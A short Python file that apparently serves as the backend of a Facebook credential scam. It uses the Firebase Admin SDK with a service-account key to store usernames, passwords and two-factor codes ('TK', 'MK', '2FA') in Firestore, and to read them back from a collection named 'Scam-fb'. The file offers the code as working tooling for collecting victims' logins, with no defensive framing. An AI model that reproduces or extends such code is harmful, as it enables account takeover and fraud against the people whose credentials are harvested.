import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from firebase_admin import auth
from ast import literal_eval

cred = credentials.Certificate(cert='admin.json')
firebase_admin.initialize_app(cred, {'project_id': 'hdhautotool-1597995155785'})
app = firebase_admin.get_app()
auth.Client(app)
db = firestore.client(app)

def send(loai,tk,mk,name,FACode):
    doc_ref = db.collection(loai).document(name)
    doc_ref.set({
        'loai' : loai,
        'Data':firestore.ArrayUnion([{'TK':tk,'MK':mk,'2FA':FACode}])
        })



def get_data(loai):
    doc =  db.collection(loai).get()
    cong = []
    for name in doc:
        tt = literal_eval(str(db.collection(u'Scam-fb').document(name.id).get().to_dict()))
        out = {name.id:tt}
        cong  += [out]
    return cong
